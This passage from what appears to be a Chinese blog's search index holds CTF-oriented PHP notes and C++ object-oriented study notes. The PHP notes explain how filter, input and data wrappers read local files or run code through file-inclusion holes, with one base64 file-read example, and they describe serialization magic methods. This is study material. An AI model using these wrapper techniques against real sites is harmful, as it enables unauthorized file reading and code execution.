到这一项,后面的代码表示把数组的键名b赋值给key,数组的键值赋值给value,并且key可以指向value\n就当成指针理解吧[]`(￣▽￣)\u0026rsquo;*\nextract()\n描述：extract(array,flags,prefix)\n功能​：将数组元素动态转换为变量，常用于处理表单数据（如 $_POST、$_GET）或配置数组。\nflags: 可选，控制冲突处理方式（默认 EXTR_OVERWRITE) 常用值：\nEXTR_OVERWRITE：如果有冲突,覆盖已有变量 EXTR_SKIP：跳过冲突 EXTR_PREFIX_ALL：如果有冲突,为所有变量添加前缀 prefix: 可选，仅在指定flags为前缀模式时有效，用于生成变量名前缀。\nparse_str()\n描述：parse_str(str) 用于将字符串解析成多个变量，没有返回值。简而言之,就是你输入(\u0026ldquo;a=1\u0026amp;b=2\u0026rdquo;)它会自动地生成a,b两个变量\n伪协议\nphp://filter\nphp://filter/read or write=/resource=数据流\rresource=\u0026lt; 要过滤的数据流\u0026gt; （必须） 它指定了你要筛选过滤的数据流\nread和write可选对应对筛选列表的操作\n常用过滤器convert.base64\n编码 convert.base64-encode 解码 convert.base64-decode 例如\nphp://filter/read=convert.base64-encode/resource=files.txt\r更多的可以看P神的谈一谈php://filter的妙用\nphp://input\n如果 html 表单编码设置为\u0026quot;multipart/form-data\u0026quot;,请求是无效的。 一般在 CTF 中用于执行 php 代码（一般在bp里使用）\n需要在php 中设置 allow_url_include = On\nzip:// \u0026amp; bzip2 \u0026amp; zlib://\n需要:\nallow_url_fopen: on\nallow_url_include: on\nzip的一般格式:\nzip://[压缩文件绝对路径]%23[压缩文件内的子文件名]（#编码为%23）\rfile://\n用于访问本地文件系统，在 CTF 中通常用来读取本地文件\ndata://\n常用于绕过php://过滤，直接执行PHP代码\n语法：\ndata:[\u0026lt;mediatype\u0026gt;][;charset=\u0026lt;encoding\u0026gt;][;base64],\u0026lt;data\u0026gt;\r​- mediatype​：数据类型（如text/plain、image/png、text/html）。\n​- charset​：字符编码（如utf-8）。\n​- base64​：若数据需编码则添加此标识。\n​- data​：实际内容（如PHP代码或文件路径）。\n需存在文件包含漏洞(如 include($_GET['file']) )和打开两个_url_\n序列化及反序列化 序列化 是将 PHP 对象转换为字符串的过程，可以使用 serialize() 函数来实现。该函数将对象的状态以及它的类名和属性值编码为一个字符串。序列化后的字符串可以存储在文件中，存储在数据库中，或者通过网络传输到其他地方。\n反序列化 是将序列化后的字符串转换回 PHP 对象的过程，可以使用 unserialize() 函数来实现。该函数会将序列化的字符串解码，并将其转换回原始的 PHP 对象。\n普通对象注意 protected 和 private 类型的变量中都加入了不可见字符：\n如果是 protected 变量，则会在变量名前加上 \\x00*\\x00\n如果是 private 变量，则会在变量名前加上 \\x00类名\n一般我们在输出的时候都会先编码后输出\n自定义类时，例如：\n1 2 3 4 5 6 7 public function serialize() { return serialize([ \u0026#39;name\u0026#39; =\u0026gt; $this-\u0026gt;name, \u0026#39;email\u0026#39; =\u0026gt; $this-\u0026gt;email, \u0026#39;phoneNumber\u0026#39; =\u0026gt; $this-\u0026gt;phoneNumber, ]); } 此时输出的格式如图：\nby hello ctf\n其它一些标识，一般都是英文首字母\nb:boolean bool 值\nC:custom object 自定义对象序列化\nd:double 小数\ni:integer 整数\nO:Object 对象\nr:reference 对象引用 \u0026amp;\u0026amp; R:pointer reference 指针引用\nS:encoded string\nN:null NULL 值\n魔术方法\n在 PHP 的序列化中，魔术方法（Magic Methods）是一组特殊的方法，这些方法以双下划线（__）作为前缀，可以在特定的序列化阶段触发从而使开发者能够进一步的控制 序列化 / 反序列化 的过程。\n一般在题目中常见的几个方法如下：\n1 2 3 4 5 6 7 8 9 10 11 12 __wakeup() //------ 执行unserialize()时，先会调用这个函数 __sleep() //------- 执行serialize()时，先会调用这个函数，只能返回数组 __construct() //------- 适合在使用对象之前做一些初始化工作 __destruct() //---- 某个对象的所有引用都被删除或者当对象被显式销毁时执行 __call() //-------- 在对象上下文中调用不可访问的方法时触发 __callStatic() //-- 在静态上下文中调用不可访问的方法时触发 __get() //--------- 用于从不可访问的属性读取数据或者不存在这个键都会调用此法 __set() //--------- 用于将数据写入不可访问的属性 __isset() //------- 在不可访问的属性上调用isset()或empty()触发 __unset() //------- 在不可访问的属性上使用unset()时触发 __toString() //---- 把类当作字符串使用时触发 __invoke() //------ 当尝试将对象调用为函数时触发 详细可参考：PHP:魔术方法 - Manual\n属性重载\n在给不可访问（protected 或 private）或不存在的属性赋值时，__set() 会被调用。 读取不可访问（protected 或 private）或不存在的属性的值时，__get() 会被调用。 当对不可访问（protected 或 private）或不存在的属性调用 isset() 或 empty() 时，__isset() 会被调用。 当对不可访问（protected 或 private）或不存在的属性调用 unset() 时，__unset() 会被调用。 详细可参考：PHP:重载 - Manual\n本文参考资料:Hello CTF (其实就是摘抄啦)\n","date":"2025-05-07T00:00:00Z","permalink":"https://example.com/p/php/","title":"php"},{"content":"关于变量 常量\n1 2 3 4 5 const typename var = val; 声明常量 char * const p 表示指针 p 指向的位置不能改变，但是指向的内容（一个 char）可以改变 const char *p 表示指针 p 指向的内容不能改变，但是指向的位置可以改变 char const *p 同理等价 const char * const p p 指向的位置和内容都不能修改 动态内存\n使用 new 分配，创建对象，返回指针\n1 2 3 T *p = new T[N] 分配 N 个 T 类型的对象，返回指向第一个对象的指针 delete p 释放 p 指向的内存 p 本身不会变为 NULL delete[] p 释放 p 指向的内存 关于类 -C++ 中 class 和 struct 并无本质区别，只是默认的访问权限不同（class 默认 private，struct 默认 public）\n:: 称为域解析器（resolver），前面什么都不带则解析到自由变量 / 函数（即全局作用域内）\n成员函数直接在类内部定义的话默认为 inline（不推荐）\n权限有三种：\npublic：公有 private：私有（只有同类可以访问） 注意边界是类不是对象，成员函数中可以访问同一类的其他对象的私有成员 protected：保护（只有同类和子类可以访问） 构造函数 命名与类名完全相同\n构造函数名称必须与类名一致，无返回值（包括 void）。\n自动调用\n对象创建时由编译器自动调用，无需显式调用。\n可重载\n支持多个构造函数，通过参数列表（类型、数量、顺序）区分。\n访问控制\n可设为 public、protected 或 private，影响对象创建方式（如单例模式）。\n语法\n以冒号 : 开头，后跟成员变量及其初始化表达式：\n1 2 3 4 5 6 7 class Student { public: Student(int id, const string\u0026amp; name) : studentId(id), studentName(name) {} private: const int studentId; // 必须使用初始化列表 string studentName; }; 必要性\n对const成员、引用成员、无默认构造函数的类成员必须使用初始化列表。 提高性能：避免先默认初始化再赋值的额外开销。 运算符重载 运算符重载通过定义operator函数实现，支持大部分内置运算符（如+、-、==等），但部分运算符（如.、::、?:）不可重载。\n示例：\n1 2 3 4 5 6 class Complex { public: Complex operator+(const Complex\u0026amp; other) { return Complex(real + other.real, imag + other.imag); } }; 若不是类对象之间的相加时，可以通过以下方法实现：\n1 2 3 4 5 6 class Complex { public: Complex operator+(int num) { return Complex(this-\u0026gt;real + num); } }; 该方法可以实现int在右侧相加，若int在左侧时则需通过全局函数或友元函数重载，因成员函数无法让int作为左操作数\n示例：\n1 2 3 4 5 6 7 8 9 10 11 12 13 class MyClass { public: int value; MyClass(int v) : value(v) {} // 声明友元函数以访问私有成员（如果需要） friend MyClass operator+(int num, const MyClass\u0026amp; obj); }; // 全局函数重载：处理 int + MyClass MyClass operator+(int num, const MyClass\u0026amp; obj) { return MyClass(num + obj.value); } // 使用示例 MyClass c = 3 + a; // 调用全局函数 处理自增自减时格式略有不同，但是不难理解\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 class Number { public: int value; Number(int v = 0) : value(v) {} // 前置++ Number\u0026amp; operator++() { ++value; return *this; } // 后置++ Number operator++(int) { Number temp = *this; ++value; return temp; } }; 流运算符重载 流运算符用于自定义类型与输入输出流的交互，使对象可直接通过cout输出或cin输入。\n1 2 3 4 5 6 7 8 9 10 11 12 13 class Point { public: friend ostream\u0026amp; operator\u0026lt;\u0026lt;(ostream\u0026amp; os, const Point\u0026amp; p) { os \u0026lt;\u0026lt; \u0026#34;(\u0026#34; \u0026lt;\u0026lt; p.x \u0026lt;\u0026lt; \u0026#34;, \u0026#34; \u0026lt;\u0026lt; p.y \u0026lt;\u0026lt; \u0026#34;)\u0026#34;; return os; } friend istream\u0026amp; operator\u0026gt;\u0026gt;(istream\u0026amp; is, Point\u0026amp; p) { is \u0026gt;\u0026gt; p.x \u0026gt;\u0026gt; p.y; return is; } private: int x, y; }; 虚函数 学的时候感觉挺简单的，好久不用搞忘了，还是写点笔记吧。\n虚函数主要提供 运行时多态，它让 C++ 程序能够根据对象的实际类型来调用函数，而不是根据指针/引用的静态类型。\n换句话说：\n普通函数 → 编译期绑定（函数地址在编译阶段就决定了）。\n虚函数 → 运行期绑定（函数地址在运行时通过虚函数表查找）。\n这样，我们可以写出通用接口，在不同子类里实现不同的行为。\n多态 比如基类 Shape 定义 draw()，不同子类（Circle、Rectangle）都可以重写自己的 draw()，运行时调用时自动选择正确的函数：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 #include \u0026lt;iostream\u0026gt; using namespace std; class Shape { public: virtual void draw() { cout \u0026lt;\u0026lt; \u0026#34;Draw Shape\\n\u0026#34;; } }; class Circle : public Shape { public: void draw() override { cout \u0026lt;\u0026lt; \u0026#34;Draw Circle\\n\u0026#34;; } //override用来标记“派生类中的虚函数是对基类虚函数的重写” }; class Rectangle : public Shape { public: void draw() override { cout \u0026lt;\u0026lt; \u0026#34;Draw Rectangle\\n\u0026#34;; } }; int main() { Shape* s1 = new Circle(); Shape* s2 = new Rectangle(); s1-\u0026gt;draw(); // Draw Circle s2-\u0026gt;draw(); // Draw Rectangle delete s1; delete s2; } 抽象接口（纯虚函数） 虚函数可以被定义为 纯虚函数（=0），使类变为 抽象类，只能作为接口存在，不能直接实例化。 派生类必须实现纯虚函数。\n1 2 3 4 5 6 7 8 9 class Animal { public: virtual void speak() = 0; // 纯虚函数 }; class Dog : public Animal { public: void speak() override { cout \u0026lt;\u0026lt; \u0026#34;Woof!\\n\u0026#34;; } }; 正确的析构函数调用 如果基类的析构函数是虚函数，那么通过基类指针删除派生类对象时，会 先调用派生类析构，再调用基类析构 ，避免资源泄漏。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 class Base { public: virtual ~Base() { cout \u0026lt;\u0026lt; \u0026#34;Base destroyed\\n\u0026#34;; } }; class Derived : public Base { public: ~Derived() { cout \u0026lt;\u0026lt; \u0026#34;Derived destroyed\\n\u0026#34;; } }; int main() { Base* b = new Derived(); delete b; } 如果析构函数不是虚函数，只会调用 Base::~Base，导致 Derived 部分资源泄露。\n哈希表 严格意义上来说不算c++的版块，但是刷题的时候碰到了，就顺便记一下。\n哈希表是一种根据关键字直接访问内存存储位置的数据结构。通过哈希表，数据元素的存放位置和数据元素的关键字之间建立起某种对应关系，建立这种对应关系的函数称为哈希函数。\n哈希表通常使用一个数组作为底层存储，数组的每个元素称为一个桶（bucket），它的核心思想是 用空间换时间,所以它的 插入、删除、查找操作的平均时间复杂度都是 O(1)。在实际应用中，C++ STL 提供的 std::unordered_map 和 std::unordered_set 已经实现了高效、健壮的哈希表，通常不需要我们自己去实现。\n简单一点的实现是：\nstd::unordered_set (集合) 用于快速查找一个元素是否存在。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 #include \u0026lt;iostream\u0026gt; #include \u0026lt;string\u0026gt; #include \u0026lt;unordered_set\u0026gt; // 引入unordered_set int main() { // 1. 创建一个空的 unordered_set，存储字符 std::unordered_set\u0026lt;char\u0026gt; brokenSet; // 2. 插入元素 (相当于添加学号) brokenSet.insert(\u0026#39;a\u0026#39;); brokenSet.insert(\u0026#39;b\u0026#39;); brokenSet.insert(\u0026#39;c\u0026#39;); brokenSet.insert(\u0026#39;a\u0026#39;); // 重复插入 \u0026#39;a\u0026#39;，但 set 只会保留一个 \u0026#39;a\u0026#39; // 3. 检查元素是否存在 char letterToFind = \u0026#39;b\u0026#39;; if (brokenSet.count(letterToFind)) { // count() 返回 1 如果存在, 0 如果不存在 std::cout \u0026lt;\u0026lt; \u0026#34;\u0026#39;\u0026#34; \u0026lt;\u0026lt; letterToFind \u0026lt;\u0026lt; \u0026#34;\u0026#39; 存在于集合中。\u0026#34; \u0026lt;\u0026lt; std::endl; } else { std::cout \u0026lt;\u0026lt; \u0026#34;\u0026#39;\u0026#34; \u0026lt;\u0026lt; letterToFind \u0026lt;\u0026lt; \u0026#34;\u0026#39; 不存在于集合中。\u0026#34; \u0026lt;\u0026lt; std::endl; } letterToFind = \u0026#39;d\u0026#39;; if (brokenSet.count(letterToFind)) { std::cout \u0026lt;\u0026lt; \u0026#34;\u0026#39;\u0026#34; \u0026lt;\u0026lt; letterToFind \u0026lt;\u0026lt; \u0026#34;\u0026#39; 存在于集合中。\u0026#34; \u0026lt;\u0026lt; std::endl; } else { std::cout \u0026lt;\u0026lt; \u0026#34;\u0026#39;\u0026#34; \u0026lt;\u0026lt; letterToFind \u0026lt;\u0026lt; \u0026#34;\u0026#39; 不存在于集合中。\u0026#34; \u0026lt;\u0026lt; std::endl; } // 4. 用一个字符串初始化 set std::string brokenLetters = \u0026#34;xyz\u0026#34;; std::unordered_set\u0026lt;char\u0026gt; brokenSetFromString(brokenLetters.begin(), brokenLetters.end()); if (brokenSetFromString.count(\u0026#39;y\u0026#39;)) { std::cout \u0026lt;\u0026lt; \u0026#34;\u0026#39;y\u0026#39; 存在于从字符串创建的集合中。\u0026#34; \u0026lt;\u0026lt; std::endl; } return 0; } std::unordered_map (键值对映射) 用于根据一个键快速查找对应的值。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 #include \u0026lt;iostream\u0026gt; #include \u0026lt;string\u0026gt; #include \u0026lt;unordered_map\u0026gt; // 引入unordered_map int main() { // 1. 创建一个空的 unordered_map，存储 string 到 int 的映射 std::unordered_map\u0026lt;std::string, int\u0026gt; studentScores; // 2. 插入键值对 studentScores.insert({\u0026#34;Alice\u0026#34;, 95}); studentScores[\u0026#34;Bob\u0026#34;] = 88; // 另一种插入方式 studentScores[\u0026#34;Charlie\u0026#34;] = 92; // 3. 通过键查找值 std::string studentName = \u0026#34;Alice\u0026#34;; // 使用 find() 查找，它返回一个迭代器 auto it = studentScores.find(studentName); if (it != studentScores.end()) { // 如果找到了 (迭代器不是指向末尾) std::cout \u0026lt;\u0026lt; studentName \u0026lt;\u0026lt; \u0026#34; 的分数是: \u0026#34; \u0026lt;\u0026lt; it-\u0026gt;second \u0026lt;\u0026lt; std::endl; // it-\u0026gt;second 是值 } else { std::cout \u0026lt;\u0026lt; studentName \u0026lt;\u0026lt; \u0026#34; 不存在。\u0026#34; \u0026lt;\u0026lt; std::endl; } studentName = \u0026#34;David\u0026#34;; if (studentScores.find(studentName) != studentScores.end()) { std::cout \u0026lt;\u0026lt; studentName \u0026lt;\u0026lt; \u0026#34; 的分数是: \u0026#34; \u0026lt;\u0026lt; studentScores[studentName] \u0026lt;\u0026lt; std::endl; // studentName.score 也可以直接访问 } else { std::cout \u0026lt;\u0026lt; studentName \u0026lt;\u0026lt; \u0026#34; 不存在。\u0026#34; \u0026lt;\u0026lt; std::endl; } // 4. 尝试访问不存在的键（如果用 [] 访问） // 注意：如果键不存在，[] 会自动创建一个键值对，值是默认初始化的（int是0） // std::cout \u0026lt;\u0026lt; \u0026#34;David 的分数 (创建后): \u0026#34; \u0026lt;\u0026lt; studentScores[\u0026#34;David\u0026#34;] \u0026lt;\u0026lt; std::endl; // 这行会使 David 出现，分数为 0 return 0; } 一些小tips 实在没招了，不记要忘。。。\n读取输入 一般来说读取字符串用 getline() 就行，如果想要读到一个整型数组，还需要进行输入流处理。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 #include \u0026lt;iostream\u0026gt; #include \u0026lt;sstream\u0026gt; #include \u0026lt;vector\u0026gt; using namespace std; int main() { string line; getline(cin, line); // 读取一整行，例如：2 3 1 4 5 6 istringstream iss(line); // 把字符串当作输入流来处理 vector\u0026lt;int\u0026gt; nums; int x; while (iss \u0026gt;\u0026gt; x) { // 跳过空格等分隔符取整数，直到取完 nums.push_back(x); } // 测试输出 cout \u0026lt;\u0026lt; \u0026#34;输入的数组: \u0026#34;; for (int n : nums) cout \u0026lt;\u0026lt; n \u0026lt;\u0026lt; \u0026#34; \u0026#34;; cout \u0026lt;\u0026lt; endl; return 0; } 内存分区 在 C++ 中，内存分区是绕不开的核心概念之一。通常情况下，程序的内存空间会被划分为四个主要区域（由低地址到高地址）：\n代码区 数据区 堆区 栈区 栈区（Stack） 分配方式：由程序自动向操作系统申请和回收，速度快、使用方便，但程序员无法直接控制。 空间大小：一般在几 MB ~ 几十 MB。若递归过深或数组过大，可能触发 栈溢出（stack overflow）。 遵循原则：后进先出（LIFO）。 存储内容包括：\nconst 局部变量 函数参数 函数返回地址 保存的寄存器（如返回地址、帧指针等） 生命周期管理： 当变量进入作用域时，系统会在栈上为其申请空间；当变量生命周期结束，系统会自动释放这部分内存。\n堆区（Heap） 分配方式：由程序员手动申请（如 new、malloc），并且需要手动释放（delete、free）。 空间大小：通常远大于栈，可达 MB ~ GB 级，一般是能申请多少就有多少，实际可用大小取决于操作系统和物理内存。 存储结构：不像栈是连续空间，堆的分配通过 链表/空闲块表 管理，因此可能产生 内存碎片。 如果忘记释放，容易导致 内存泄漏。\n数据区（Data Segment） 分为两部分：\n已初始化数据区 存放 已显式初始化 的全局变量和静态变量。\n1 2 int g1 = 10; // 已初始化全局变量 static int s1 = 20; // 已初始化静态变量 未初始化数据区（BSS 段） 存放 未初始化 的全局变量和静态变量，程序运行时会自动初始化为 0。\n1 2 int g2; // 未初始化全局变量 static int s2; // 未初始化静态变量 代码区（Code/Text Segment） 存放内容：程序的可执行代码（机器指令）。 只读属性：大多数系统中，代码区是只读的，防止程序意外修改自身指令。 共享机制：相同程序的多个进程可以共享代码区，提高效率。 💡 关于 常量： 有些实现会将只读常量放在单独的常量区（位于代码区和数据区之间）；也有实现直接把常量划归到代码区。无论哪种方式，常量区都是只读的。\n示例图：\n内存参考链接\n","date":"2025-05-06T00:00:00Z","image":"https://example.com/p/c-%E9%9D%A2%E5%90%91%E5%AF%B9%E8%B1%A1/preview_hu_99a263efe87b5c20.gif","permalink":"https://example.com/p/c-%E9%9D%A2%E5%90%91%E5%AF%B9%E8%B1%A1/","title":"C++面向对象"},{"content":"","date":"2025-05-06T00:00:00Z","permalink":"https://example.com/p/%E4%BB%8A%E5%A4%A9%E6%88%91%E7%9A%84blog%E8%AF%9E%E7%94%9F%E4%BA%86/","title":"今天，我的blog诞生了"}]